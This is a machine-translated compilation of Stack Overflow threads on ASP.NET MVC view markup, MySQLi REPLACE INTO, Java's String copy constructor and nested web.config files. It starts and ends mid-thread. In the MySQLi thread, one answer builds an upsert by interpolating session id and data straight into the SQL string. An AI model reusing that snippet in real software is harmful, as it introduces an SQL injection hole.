    var NextPost = ViewData.Model.NextPost;

    // Display the "Next and Previous" links
    if (PreviousPost != null || NextPost != null)
    {
  %>

 <div>

        <%= PreviousPost == null
                ? string.Empty
                : Html.ActionLinkSpan("<< " + PreviousPost.Subject,
                                "view",
                                new { id = PreviousPost.Id },
                                new { style = "float: left;" } ) %>
          <%= NextPost == null
                ? string.Empty
                : Html.ActionLinkSpan( NextPost.Subject + " >>",
                                   "view",
                                    new { id = NextPost.Id },
                                    new { style = "float: right;" } ) %>

  <div style="clear: both;" />
  </div>

  <% } %> 
```

* * *

## 回答 #7

> 赞同：14
> 
> 时间：2009-04-23T04:51:45.733

请看一下 Rob Conery 的帖子[I Spose I'll Just Say It: You Should Learn MVC](http://rob.conery.io/2009/04/22/i-spose-ill-just-say-it-you-should-learn-mvc/)

* * *

## 回答 #8

> 赞同：13
> 
> 时间：2008-12-24T04:46:15.937

MVC 的重要之处在于它是一个已经存在很长时间的概念框架，它已证明自己是一种高效、强大的方式来构建水平和垂直扩展的 Web 应用程序和工作站应用程序。它直接回到 Alto 和 Smalltalk。微软迟到了。我们现在使用 ASP.NET MVC 所拥有的东西真的很原始，因为有很多事情要做。但是该死的，他们正在快速而疯狂地推出新版本。

Ruby on Rails 有什么大不了的？Rails 是 MVC。开发人员一直在转换，因为通过口耳相传，它已成为程序员提高生产力的方式。

这是一笔大买卖；MVC 和对 jQuery 的隐含支持是微软接受平台中立至关重要的临界点。它的中立之处在于，与 Web 表单不同，Microsoft 无法在概念上锁定您。您可以使用所有 C# 代码并完全用另一种语言重新实现（例如 PHP 或 java - 您可以命名它），因为它是可移植的 MVC 概念，而不是代码本身。（想想你可以把你的设计作为一个工作站应用程序来实现，只需要很少的代码更改，也没有设计更改，这是多么巨大。试试 Web 表单。）

Microsoft 已决定 Web Forms 不会成为下一个 VB6。

* * *

## 回答 #9

> 赞同：9
> 
> 时间：2008-12-24T19:01:10.717

与 Web 表单相比，ASP.NET MVC 框架的两个主要优点是：

1.  **可测试**性 - Web 表单中的 UI 和事件几乎无法测试。使用 ASP.NET MVC，单元测试控制器操作和它们呈现的视图很容易。这带来了前期开发成本，但研究表明，从长远来看，当需要重构和维护应用程序时，这是值得的。
2.  **更好地控制呈现的 HTML** - 你声明你不关心呈现的 HTML，因为没有人看它。如果这是正确格式化 HTML 的唯一原因，那么这是一个有效的投诉。需要正确格式化 HTML 的原因有很多，包括：SEO、更频繁地使用 id 选择器的能力（在 css 和 javascript 中）、由于缺少视图状态和可笑的长 id (ctl00_etcetc) 而导致的页面占用空间更小。

现在，这些原因并没有真正使 ASP.NET MVC 比黑白形式的 Web 表单更好或更差。ASP.NET MVC 有其优点和缺点，就像 Web 表单一样。然而，大多数对 ASP.NET MVC 的抱怨似乎源于缺乏对如何使用它的理解，而不是框架中的实际缺陷。您的代码感觉不正确或看起来不正确的原因可能是因为您拥有多年的 Web 表单经验并且只有 1-2 个月的 ASP.NET MVC 经验。

这里的问题不在于 ASP.NET MVC 摇摆不定或糟糕透顶，而在于它是新的并且对于如何正确使用它几乎没有达成一致意见。ASP.NET MVC 对您的应用程序中发生的事情提供了更细粒度的控制。这可以使某些任务更容易或更难，具体取决于您如何处理它们。

* * *

## 回答 #10

> 赞同：8
> 
> 时间：2008-12-24T05:32:17.730

嘿，我也一直在努力切换到 MVC。我绝对不是经典 ASP 的粉丝，而 MVC 渲染让我想起了很多那些日子。但是，我使用 MVC 的次数越多，它对我的​​影响就越大。我是一个 webforms 人（和很多人一样）并且在过去的几年中习惯于使用数据网格等。使用被带走的 MVC。HTML Helper 类就是答案。

就在最近，我花了 2 天时间试图找出在 MVC 中将分页添加到“网格”的最佳方法。现在，有了网络表单，我可以立即把它搞定。但我会说……一旦我为 MVC 构建了分页帮助器类，实现起来就变得非常简单。对我来说，甚至比网络表单更容易。

话虽如此，我认为当有一组一致的 HTML Helpers 时，MVC 将更加便于开发人员使用。我认为在不久的将来，我们将开始看到大量的 HTML 帮助类出现在网络上。

* * *

## 回答 #11

> 赞同：8
> 
> 时间：2008-12-24T15:49:03.523

这很有趣，因为这就是我第一次看到网络表单时所说的。

* * *

## 回答 #12

> 赞同：6
> 
> 时间：2008-12-24T05:25:31.067

我承认我还没有获得 asp.net MVC。我正在尝试在我正在做的一个副项目中使用它，但它的速度很慢。

除了不能做在网络表单中很容易做的事情之外，我还注意到标签汤。从这个角度来看，它似乎确实倒退了一步。我一直希望，随着我的学习，它会变得更好。

到目前为止，我注意到使用 MVC 的首要原因是获得对 HTML 的完全控制。我还读到 asp.net MVC 能够比 Web 表单更快地提供更多页面，并且可能与此相关，单个页面大小小于平均 Web 表单页面。

我真的不在乎我的 HTML 看起来像什么，只要它在主流浏览器中工作，但我确实关心我的页面加载速度有多快以及它们占用了多少带宽。

* * *

## 回答 #13

> 赞同：6
> 
> 时间：2008-12-24T13:08:02.257

虽然我完全同意这是丑陋的标记，但我认为使用丑陋的视图语法来注销整个 ASP.NET MVC 是不公平的。视图语法从 Microsoft 中得到的关注最少，我完全期待很快能做些什么。

其他答案已经讨论了整个 MVC 的好处，所以我将重点介绍视图语法：

鼓励使用 Html.ActionLink 和其他生成 HTML 的方法是朝错误方向迈出的一步。这有点服务器控制的味道，对我来说，它正在解决一个不存在的问题。如果我们要从代码中生成标签，那么为什么还要使用 HTML 呢？我们可以只使用 DOM 或其他模型并在控制器中构建我们的内容。好吧，这听起来很糟糕，不是吗？哦，是的，关注点分离，这就是我们有观点的原因。

我认为正确的方向是让视图语法尽可能像 HTML。请记住，设计良好的 MVC 不仅应该让您将代码与内容分离，还应该让精通布局的人员在视图上工作（即使他们不知道 ASP.NET），从而简化您的生产，然后以后作为开发人员，您可以介入并使视图模型真正动态化。只有当视图语法看起来非常像 HTML 时才能这样做，以便布局人员可以使用 DreamWeaver 或任何当前流行的布局工具。您可能要同时构建数十个站点，并且需要以这种方式扩展以提高生产效率。让我举一个例子来说明我如何看待“语言”视图的工作：

```
<span mvc:if="ViewData.Model.ShowPrevious" style="float: left;">
    <a mvc:inner="ViewData.Model.PreviousPost.Subject" href="view/{ViewData.Model.PreviousPost.Id}">sample previous subject</a>
</span> 
<span mvc:if="ViewData.Model.ShowNext" style="float: left;">
    <a mvc:inner="ViewData.Model.NextPost.Subject" href="view/{ViewData.Model.NextPost.Id}">sample next subject</a>
</span> 
<div mvc:if="ViewData.Model.ShowNextOrPrevious" style="clear: both;" /> 
```

这有几个优点：

*   看起来更好
*   更简洁
*   HTML 和 <% %> 标签之间没有时髦的上下文切换
*   易于理解且不言自明的关键字（即使是非程序员也可以这样做 - 有利于并行化）
*   尽可能多的逻辑移回控制器（或模型）
*   没有生成的 HTML - 再一次，这使得人们很容易进入并知道在哪里设置样式，而不必弄乱 Html。方法
*   代码中有示例文本，当您在浏览器中将视图加载为纯 HTML 时呈现（再次，对布局人员有好处）

那么，这个语法到底是做什么的呢？

mvc:inner="" - 引号中的任何内容都被评估，标签的内部 HTML 被替换为结果字符串。（我们的示例文本被替换）

mvc:outer="" - 引号中的任何内容都会被评估，标签的外部 HTML 会被替换为结果字符串。（同样，示例文本被替换。）

{} - 这用于在属性内插入输出，类似于 <%= %>

mvc:if="" - qoutes 是要评估的布尔表达式。if 的关闭是 HTML 标记关闭的地方。

mvc:否则

mcv:elseif="" - ...

mvc:foreach

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2009-09-05T18:02:50.827

现在，我只能在这里为自己说话：

IMO，如果您是顽固分子（任何事情），那么转换不适合您。如果您喜欢 WebForms，那是因为您可以完成您需要做的事情，这也是 any 的目标。

*Webforms 在从开发人员*那里抽象出 HTML 方面做得很好。如果这是您的目标，请坚持使用 Web 表单。您拥有使桌面开发成为今天这样的所有美妙的“单击和拖动”功能。有许多包含的控件（加上大量的第三方控件）可以带来不同的功能。您可以从数据库中拖动与 DataSource 直接关联的“网格”；它带有内置的内联编辑、分页等。

截至目前，ASP.NET MVC 在第三方控件方面非常有限。同样，如果您喜欢快速应用程序开发，其中很多功能都为您连接，您不应该尝试转换。

综上所述，这就是 ASP.NET 的亮点： - TDD。nuff 说，代码是不可测试的。

*   关注点分离。这就是 MVC 模式的支柱。我完全知道您可以在 Web 表单中完成此操作。但是，我喜欢强加的结构。在 Web 表单中混合设计和逻辑太容易了。ASP.NET MVC 使团队的不同成员可以更轻松地处理应用程序的不同部分。

*   来自其他地方：我的背景是 CakePHP 和 Ruby on Rails。所以，很明显我的偏见在哪里。这只是关于您对什么感到满意。

*   学习曲线：扩展最后一点；我讨厌“模板化”来改变不同元素的功能的想法。我不喜欢很多设计都是在代码隐藏文件中完成的事实。当我已经非常熟悉 HTML 和 CSS 时，这是要学习的另一件事。如果我想在页面上的“元素”中做某事，我会插入“div”或“span”，在其上打上一个 ID，然后我就走了。在 Web 表单中，我将不得不去研究如何做到这一点。

*   Web“设计”的现状：像 jQuery 这样的 Javascript 库正变得越来越普遍。Web 窗体破坏您的 ID 的方式只会使实现（在 Visual Studio 之外）更加困难。

*   更多分离（设计）：因为很多设计都连接到您的控件中，所以外部设计师（没有 Web 窗体）知识很难处理 Web 窗体项目。Web Forms 旨在成为一切。

同样，这些原因大多源于我对 Web 表单的不熟悉。Web 窗体项目（如果设计正确）可以拥有 ASP.NET MVC 的“大部分”好处。但这就是警告：“如果设计正确”。这只是我不知道如何在 Web 窗体中做的事情。

如果您在 Web 表单中做出色的工作，那么您的工作效率很高，而且它适合您，这就是您应该待在的地方。

基本上，对两者进行快速审查（尝试找到一个公正的来源[祝你好运]）并列出优缺点，评估哪一个适合您的目标并据此选择。

最重要的是，选择阻力最小且收益最大的路径来实现您的目标。Web Forms 是一个非常成熟的框架，未来只会变得更好。ASP.NET MVC 只是另一种选择（吸引像我这样的 Ruby on Rails 和 CakePHP 开发人员：P）

* * *

## 回答 #15

> 赞同：3
> 
> 时间：2008-12-24T16:16:46.713

Java EE 的 JSP 在首次提出时看起来像这样——丑陋的 scriptlet 代码。

然后他们提供了标签库，使它们更像 HTML 标签。问题是任何人都可以编写标签库。一些结果是灾难性的，因为人们将大量逻辑（甚至样式）嵌入到生成 HTML 的标签库中。

我认为最好的解决方案是 JSP 标准标记库 (JSTL)。它是“标准的”、HTML 标记的，有助于防止人们将逻辑放入页面。

另一个好处是它保留了网页设计师和开发人员之间的分界线。我看到的好的网站是由具有审美意识和可用性设计的人设计的。他们布置页面和 CSS 并将它们传递给开发人员，开发人员添加动态数据位。作为缺乏这些天赋的开发人员，我认为当我们要求开发人员编写从汤到坚果的网页时，我们放弃了一些重要的东西。Flex 和 Silverlight 会遇到同样的问题，因为设计师不太可能熟悉 JavaScript 和 AJAX。

如果 .NET 有类似于 JSTL 的路径，我建议他们调查一下。

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2011-07-28T09:17:28.813

只是想与自 ASP .NET MVC 3 以来默认使用的闪亮的新[Razor 视图引擎分享此示例的外观。](http://weblogs.asp.net/scottgu/archive/2010/07/02/introducing-razor.aspx)

```
@{ 
    var prevPost = ViewData.Model.PreviousPost;
    var nextPost = ViewData.Model.NextPost;
}

@if (prevPost != null || nextPost != null) {
    <div>
        @if (prevPost != null) {
            <span style="float: left;">
                @Html.ActionLink("<< " + prevPost.Subject, "view", new { id = prevPost.Id })
            </span>
        }
        @if (nextPost != null) {
            <span style="float: left;">
                @Html.ActionLink(nextPost.Subject + " >>", "view", new { id = nextPost.Id })
            </span>
        }
        <div style="clear: both;" />
    </div>
} 
```

有什么问题吗？
此外，您实际上不应该内联您的 CSS 样式，对吗？为什么要在三个地方而不是两个地方检查无效性？一个额外的`div`很少伤害。这就是我的做法：

```
<div>
    @if (prevPost != null) {
        @Html.ActionLink("<< " + prevPost.Subject, "view",
            new { id = prevPost.Id, @class = "prev-link" })
    }
    @if (nextPost != null) {
        @Html.ActionLink(nextPost.Subject + " >>", "view",
            new { id = nextPost.Id, @class = "next-link" })
    }
    <div class="clear" />
</div> 
```

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2008-12-25T00:37:21.990

我不能直接谈论 ASP.NET MVC 项目，但一般来说，MVC 框架已经开始主导**Web**应用程序开发，因为

1.  它们提供了数据库操作、业务逻辑和表示之间的正式分离

2.  它们在视图中提供了足够的灵活性，以允许开发人员调整其 HTML/CSS/Javascript 以在多个浏览器**以及这些浏览器的未来版本中工作**

最后一点才是最重要的。使用 Webforms 和类似技术，您依赖供应商为您编写 HTML/CSS/Javascript。它很强大，但你不能保证当前版本的 Webforms 可以与下一代 Web 浏览器一起使用。

这就是观点的力量。您可以完全控制应用程序的 HTML。不利的一面是，**您**需要有足够的纪律性以将视图中的逻辑保持在最低限度，并使模板代码尽可能简单。

所以，这就是权衡。如果 Webforms 为您工作而 MVC 不适合，那么**请继续使用 Webforms**

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2009-01-26T22:11:48.497

我对它的大部分挫败感只是不知道如何“正确”地做事。自从它作为预览版发布以来，我们都有一些时间来看看这些东西，但它们已经发生了很大的变化。起初我真的很沮丧，但该框架似乎足够可行，使我能够非常快速地创建极其复杂的 UI（阅读：Javascript）。我知道您可以像以前一样使用 Webforms 来执行此操作，但是尝试使所有内容正确呈现是一个巨大的痛苦。很多时候，我最终会使用中继器来控制精确的输出，并且最终会得到很多上面的意大利面条混乱。

为了避免出现同样的混乱，我一直在使用域、服务层和 dto 的组合来传输到视图。将它与视图引擎 spark 结合起来，它会变得非常好。设置需要一些时间，但一旦你开始使用，我已经看到我的应用程序的复杂性在视觉上有了很大的提高，但它在代码方面非常简单。

我可能不会完全这样做，但这是你的例子：

```
<if condition="myDtp.ShowPager">
  <div>
    <first />
    <last />
    <div style="clear: both;" />
  </div>
</if> 
```

这是相当可维护、可测试的，并且在我的代码汤中味道很好。

要点是干净的代码确实是可能的，但这与我们做事的方式相比是一个很大的转变。不过，我不认为每个人都对此感到满意。我知道我还在想办法...

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2009-05-04T23:02:49.450

Apress 的 Steve Sanderson 最近出版的书 'Pro ASP.NET MVC' [1] [2] 提出了另一种选择——创建自定义 HtmlHelper 扩展。他的示例（来自第 110 页的第 4 章）使用了分页列表的示例，但它可以很容易地适应您的情况。

```
public static string PostNavigator(this HtmlHelper html, Post previous, Post next, Func<int, string> pageUrl)
{
    StringBuilder result = new StringBuilder();

    if (previous != null || next != null)
    {
        result.Append("<div>");

        if (previous != null)
        {
            result.Append(@"<span class=""left"">");
            TagBuilder link = new TagBuilder("a");
            link.MergeAttribute("href", pageUrl(previous.Id));
            link.InnerHtml = String.Format("<< {0}", html.Encode(previous.Subject));
            result.Append(link.ToString());
            result.Append("</span>");
        }

        if (next != null)
        {
            if (previous != null)
            {
                result.Append(" ");
            }

            result.Append(@"<span class=""right"">");
            TagBuilder link = new TagBuilder("a");
            link.MergeAttribute("href", pageUrl(next.Id));
            link.InnerHtml = String.Format("{0} >>", html.Encode(next.Subject));
            result.Append(link.ToString());
            result.Append("</span>");
        }

        result.Append("</div>");
    }

    return result.ToString();
} 
```

您可以使用如下代码在视图中调用它：

```
<%= Html.PostNavigator(ViewData.Model.PreviousPost, ViewData.Model.NextPost, id => Url.Action("View", new { postId = id })) %> 
```

[1][http://blog.codeville.net/2009/04/29/now-published-pro-aspnet-mvc-framework-apress/](http://blog.codeville.net/2009/04/29/now-published-pro-aspnet-mvc-framework-apress/)

[2] [http://books.google.com/books?id=Xb3a1xTSfZgC](http://books.google.com/books?id=Xb3a1xTSfZgC)

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2009-08-08T04:00:47.297

我也是; 我会把时间花在 Silverlight 而不是 ASP.NET MVC 上。我已经尝试过 MVC 1.0 并在几天前查看了最新的 2.0 Beta 1 版本。

我（不能）觉得 ASP.NET MVC 比 webform 更好。MVC的卖点是：

1.  单元测试）

2.  分离设计（视图）和逻辑（控制器+模型）

3.  没有视图状态和更好的元素 ID 管理

4.  RESTful URL 和更多...

但是 webform，通过使用 code-behind.Theme、Skin 和 Resource 已经很完美地分离了设计和逻辑。

Viewstate：客户端 ID 管理即将出现在 ASP.NET 4.0 上。我只关心单元测试，但单元测试不足以成为让我从 webform 转向 ASP.NET MVC 的理由。

也许我可以说：ASP.NET MVC 还不错，但是 webform 已经足够了。

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2010-01-20T17:02:51.043

我希望看到 Phil Haack 的帖子，但它不在这里，所以我只是从 [http://blog.wekeroad.com/blog/i-spose-ill-just-say-it-you-should剪切并粘贴它-learn-mvc/](http://blog.wekeroad.com/blog/i-spose-ill-just-say-it-you-should-learn-mvc/)在评论部分

> Haacked - 2009 年 4 月 23 日 - Rob，你是个暴动者！:) 当人们在 MVC 中编写意大利面条代码然后说“看！意大利面条！”时，我确实觉得很有趣。嘿，我也可以在 Web 窗体中编写意大利面条代码！我可以用 Rails、PHP、Java、Javascript 编写它，但不能用 Lisp。但这只是因为我还不能用 Lisp 写任何东西。当我写意大利面条代码时，我不会闷闷不乐地看着我的盘子，期待看到通心粉。人们在将其与经典 ASP 进行比较时经常提出的观点是，与经典 ASP 相比，人们倾向于混合关注点。页面将具有用户输入处理与模型代码和业务逻辑混合在一起的视图逻辑。这就是意大利面的意义所在！将所有问题混为一团。使用 ASP.NET MVC，如果您遵循该模式，则不太可能这样做。是的，您的视图中可能仍然有一些代码，但希望这都是视图代码。该模式鼓励您不要将用户交互代码放在那里。将其放入控制器中。将您的模型代码放在模型类中。那里。没有意大利面。现在是 O-Toro Sushi。:)

* * *

## 回答 #22

> 赞同：-1
> 
> 时间：2008-12-24T06:53:00.110

自从 Preview 3 发布以来，我一直在使用 MVC，虽然它仍然存在成长的烦恼，但它在团队开发领域有很大帮助。尝试让三个人在一个 Web 表单页面上工作，然后您就会理解将头撞到墙上的概念。我可以与了解视图页面上的设计元素的开发人员和我们的常驻 Linq 之神一起制作模型，同时我将所有内容放在控制器中。我从来没有能够在一个关注点分离如此容易实现的领域中进行开发。

ASP.Net MVC 的最大卖点[——StackOverflow 在 MVC 堆栈上运行。](http://www.hanselminutes.com/default.aspx?showID=152)

话虽这么说...您的代码比我通常对视图页面所做的要漂亮得多。此外，与我一起工作的其中一个人正在将 HTML 帮助程序包装到标签库中。而不是 <%=Html.RandomFunctionHere() %> 它像

< hh:随机函数 />

我只是希望 MVC 团队在某个时候能够解决这个问题，因为我相信他们会做得更好。

* * *

## 回答 #23

> 赞同：-2
> 
> 时间：2008-12-25T11:27:14.487

使用外观模式来包装您需要显示的所有数据的所有逻辑，然后将其用作您的视图中的泛型，然后......不再有意大利面条代码。 [http://en.wikipedia.org/wiki/Design_pattern_(computer_science)](http://en.wikipedia.org/wiki/Design_pattern_(computer_science))

如果您需要更多帮助 cgardner2020@gmail.com

* * *

## 回答 #24

> 赞同：-17
> 
> 时间：2008-12-24T03:57:55.627

ASP.NET MVC 的实现是可怕的。产品很烂。我看过它的几个演示，我为 MSFT 感到羞耻……我敢肯定写它的人比我聪明，但几乎就好像他们不知道模型-视图-控制器是什么.

我认识的唯一尝试实现 MVC 的人是喜欢尝试来自 MSFT 的新事物的人。在我看过的演示中，主持人带着歉意的语气......

我是 MSFT 的忠实粉丝，但我不得不说我认为没有理由为他们的 MVC 实现而烦恼。要么使用 Web Forms 要么使用 jquery 进行 Web 开发，不要选择这个可憎的。

**编辑：**

模型-视图-控制器架构设计模式的目的是将您的域与表示与业务规则分开。我已经在我实现的每个 Web 窗体项目中成功地使用了该模式。ASP.NET MVC 产品不适合实际的架构设计模式。

# php - MySQLi 准备好的语句和 REPLACE INTO

> ID：390702
> 
> 赞同：0
> 
> 时间：2008-12-24T03:57:19.090
> 
> 标签：php, mysql, mysqli

我必须遵循代码：

[http://www.nomorepasting.com/getpaste.php?pasteid=22987](http://www.nomorepasting.com/getpaste.php?pasteid=22987)

如果`PHPSESSID`不在表中，则`REPLACE INTO`查询工作正常，但是如果`PHPSESSID`存在，则执行调用成功，但 sqlstate 设置为“HY000”，这不是很有帮助，`$_mysqli_session_write->errno`并且 `$_mysqli_session_write->error`都是空的，并且数据列不会更新。

我相当确定问题出在我的脚本中，因为`REPLACE INTO`无论表中是否存在手动执行 from mysql 都可以正常工作`PHPSESSID`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T09:25:41.423

您为什么要在会话打开功能中进行准备？我不相信 write 函数在会话期间被调用一次以上，因此在公开场合准备它对您没有多大帮助，您不妨在会话写入中这样做。

无论如何，我相信您在表名之后和列列表之前需要一些空格。如果没有空格，我相信 mysql 会表现得好像您在尝试调用名为 session() 的不存在的函数一样。

```
REPLACE INTO session (phpsessid, data) VALUES(?, ?) 
```

* * *

> *MySQL 认为 'COUNT ( )' 和 'COUNT(* )'之间没有区别

有趣的是，当我在 mysql CLI 中运行以下命令时，我似乎得到了不同的结果。

```
mysql> select count (*);
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*)' at line 1
mysql> select count(*);
+----------+
| count(*) |
+----------+
|        1 | 
+----------+
1 row in set (0.00 sec) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-11T12:44:38.297

`REPLACE INTO` executes 2 queries: first a `DELETE` then an `INSERT INTO`. (So a new auto_increment is "By Design")

I'm also using the `REPLACE INTO` for my database sessions, but I'm using the `MySQLi->query()` in combination with `MySQLI->real_escape_string()` in stead of a `MySQLi->prepare()`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-31T23:08:08.857

因此，事实证明，使用 REPLACE 还存在其他我不知道的问题：

[Bug #10795: REPLACE reallocates new AUTO_INCREMENT](http://bugs.mysql.com/bug.php?id=10795) (Which according to the comments is not actually a bug but the 'expected' behaviour)

As a result my id field keeps getting incremented so the better solution is to use something along the lines of:

```
 INSERT INTO session(phpsessid, data) VALUES('{$id}', '{$data}')
     ON DUPLICATE KEY UPDATE data='{$data}' 
```

This also prevents any foreign key constraints from breaking and potential causing data integrity problems.

# java - Java 中表达式“new String(...)”的目的是什么？

> ID：390703
> 
> 赞同：75
> 
> 时间：2008-12-24T03:57:38.560
> 
> 标签：java, string

在查看在线代码示例时，我有时会通过使用 new 运算符将 String 常量分配给 String 对象。

例如：

```
String s;
...
s = new String("Hello World"); 
```

当然，这与

```
s = "Hello World"; 
```

我不熟悉这种语法，也不知道目的或效果是什么。由于字符串常量通常存储在常量池中，然后以 JVM 用于处理字符串常量的任何表示形式存储，是否会在堆上分配任何内容？

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2008-12-24T05:57:18.630

*您可能认为*您想要的一个地方`new String(String)`是强制内部字符数组的不同副本，如

```
small=new String(huge.substring(10,20)) 
```

然而，不幸的是，这种行为没有记录并且依赖于实现。

在将大文件（一些高达 20 MiB）读入字符串并在事后将其雕刻成行时，我对此感到很痛苦。我最终得到了引用由整个文件组成的 char[] 的行的所有字符串。不幸的是，这无意中保留了对整个数组的引用，因为我坚持的几行比处理文件的时间更长——我被迫使用`new String()`它来解决它，因为处理 20,000 个文件很快就会消耗大量 RAM。

唯一与实现无关的方法是：

```
small=new String(huge.substring(10,20).toCharArray()); 
```

不幸的是，这必须复制数组两次，一次`toCharArray()`在 String 构造函数中复制一次。

需要有一个记录的方法来通过复制现有字符串的字符来获取新字符串；或者`String(String)`需要改进文档以使其更加明确（那里有一个暗示，但它相当模糊并且可以解释）。

### 假设文档未说明的内容的陷阱

为了回应不断出现的评论，请观察 Apache Harmony 的实现`new String()`是什么：

```
public String(String string) {
    value = string.value;
    offset = string.offset;
    count = string.count;
} 
```

没错，那里没有底层数组的副本。然而，它仍然符合 (Java 7) String 文档，因为它：

> 初始化一个新创建的 String 对象，使其表示与参数相同的字符序列；换句话说，新创建的字符串是参数字符串的副本。除非需要原始的显式副本，否则不需要使用此构造函数，因为字符串是不可变的。

突出的部分是“参数***字符串***的副本”；它没有说“参数字符串的副本和支持该字符串的底层字符数组”。

请注意您对*文档*进行编程，而不是针对**一种** *实现*进行编程。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-24T04:28:03.210

我发现这有用的唯一一次是声明锁变量：

```
private final String lock = new String("Database lock");

....

synchronized(lock)
{
    // do something
} 
```

在这种情况下，Eclipse 等调试工具将在列出线程当前持有或等待的锁时显示该字符串。您必须使用“新字符串”，即分配一个新的字符串对象，否则共享字符串文字可能会被锁定在其他一些不相关的代码中。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-09-11T12:43:52.760

Software Monkey 和 Ruggs 描述的此构造函数的唯一实用程序似乎已从 JDK7 中消失。String 类中不再有`offset`字段，子字符串总是使用

```
Arrays.copyOfRange(char[] original, int from, int to) 
```

修剪副本的 char 数组。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-01-18T19:28:53.837

**字符串 s1="foo";** 文字将进入 StringPool 并且 s1 将引用。

**字符串 s2="foo";** 这次它将检查“foo”文字是否已在 StringPool 中可用或不存在，因此 s2 将引用相同的文字。

**字符串 s3=new String("foo");** “foo”字面量将首先在 StringPool 中创建，然后通过字符串 arg 构造函数创建字符串对象，即由于通过 new 运算符创建对象而在堆中创建“foo”，然后 s3 将引用它。

**字符串 s4=new String("foo");** 和s3一样

所以**System.out.println(s1==s2);** // **true**由于文字比较。

和**System.out.println(s3==s4);** //由于对象比较而为**false**（s3 和 s4 在堆中的不同位置创建）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-24T04:41:07.850

好吧，这取决于示例中的“...”是什么。例如，如果它是一个 StringBuffer，或者一个字节数组，或者其他东西，你会得到一个由你传递的数据构造的 String。

但是，如果它只是另一个字符串，如，那么在所有情况下都`new String("Hello World!")`应该用 simple 替换它。`"Hello World!"`字符串是不可变的，因此克隆一个没有任何用处——创建一个新的 String 对象只是为了作为现有 String 的副本（无论它是文字还是您已经拥有的另一个 String 变量）更冗长且效率更低。

事实上，Effective Java（我强烈推荐）正是使用它作为“避免创建不必要的对象”的示例之一：

* * *

作为不该做什么的一个极端示例，请考虑以下语句：

```
String s = new String("stringette");  **//DON'T DO THIS!** 
```

* * *

（Effective Java，第二版）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-08-30T16:47:55.613

这是《Effective Java Third Edition》（第 17 条：最小化可变性）一书中的引述：

> 不可变对象可以自由共享这一事实的结果是，您永远不必为它们制作防御性副本（第 50 条）。事实上，您根本不需要制作任何副本，因为副本将永远等同于原件。因此，您不需要也不应该在不可变类上提供克隆方法或复制构造函数（第 13 项）。在 Java 平台的早期，这一点并没有被很好地理解，因此 String 类确实有一个复制构造函数，但它应该很少使用，如果有的话。

所以 Java 的决定是错误的，因为`String`类是不可变的，它们不应该为这个类提供复制构造函数，如果你想对不可变的类进行昂贵的操作，你可以使用公共的可变伴生类，`StringBuilder`它们`StringBuffer`是`String`.

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2008-12-24T04:16:55.837

通常，这表明有人不习惯在初始化时声明的新式 C++ 风格。

在 C 时代，在内部范围内定义自动变量被认为不是一种好的形式。C++ 消除了解析器的限制，Java 扩展了它。

所以你看到的代码

```
int q;
for(q=0;q<MAX;q++){
    String s;
    int ix;
    // other stuff
    s = new String("Hello, there!");
    // do something with s
} 
```

在极端情况下，所有声明都可能位于函数的顶部，而不是像`for`这里的循环那样处于封闭范围内。

但是，一般来说，这样做的效果是导致 String ctor 被调用一次，并且结果 String 被丢弃。（避免这种情况的愿望正是导致 Stroustrup 允许在代码中的任何位置声明的原因。）所以你是正确的，它充其量是不必要的和糟糕的风格，而且可能实际上是糟糕的。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2013-05-15T11:58:45.450

有两种方法可以在 Java 中创建字符串。以下是这两种方式的示例： 1) 声明一个 String 类型的变量（Java 中的一个类）并将其分配给一个应该放在双引号之间的值。这将在内存的字符串池区域中创建一个字符串。例如：字符串 str = "JAVA";

2）使用 String 类的构造函数并传递一个字符串（在双引号内）作为参数。例如：String s = new String("JAVA"); 这将在主内存和字符串池中创建一个新的字符串 JAVA，如果该字符串尚未存在于字符串池中。

* * *

## 回答 #9

> 赞同：-2
> 
> 时间：2008-12-24T04:19:12.400

我想这将取决于您看到的代码示例。

大多数情况下，在代码示例中使用类构造函数“new String()”只是为了显示一个非常熟悉的 java 类，而不是创建一个新类。

您应该避免在大多数情况下使用它。不仅因为字符串文字是被实习的，而且主要是因为字符串是不可变的。有两个副本代表同一个对象是没有意义的。

虽然 Ruggs 提到的文章*“有趣”*，但除非在非常特殊的情况下，否则不应使用它，因为它可能造成的弊大于利。您将编写实现而不是规范，并且相同的代码无法在 JRockit、IBM VM 或其他中运行相同的代码。

# asp.net - 嵌套文件夹中的 web.config

> ID：390723
> 
> 赞同：2
> 
> 时间：2008-12-24T04:17:11.797
> 
> 标签：asp.net, web-config, nested-forms

我正在尝试在另一个 Web 应用程序中安装一个应用程序。我有我的 .aspx 页面和一些放入主应用程序的 app_code 文件夹的代码。我已经为我的连接字符串等添加了自己的 web.config 文件，但我认为存在冲突。所以我的问题是两个部分。首先，在另一个应用程序中安装应用程序的最佳方法是什么，即我应该使用主应用程序 app_code 文件夹还是添加我自己的文件夹，其次，这两个 web.config 文件是否会发生冲突。我的印象是这些文件是从最具体的 web.config 文件中提取的。我的安全性似乎存在问题，我无法访问我的文件。我将此归因于两个 web.config 文件，

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T04:22:50.460

关于您的第一个问题，我宁愿将它们部署在不同的文件夹中。其次，例如，如果您在默认网站中有一个网站，您将同时拥有 web.config，但更具体的将覆盖默认网站中 web.config 的某些属性，但那些未被覆盖的将在那里，（即，HTTPHandlers，HTTPModules，站点将尝试加载它们，因此您需要在 HttpModules 中添加删除标记以删除它们）。

希望这能澄清你的问题

* * *

## 回答 #2

> 赞同：1
> 
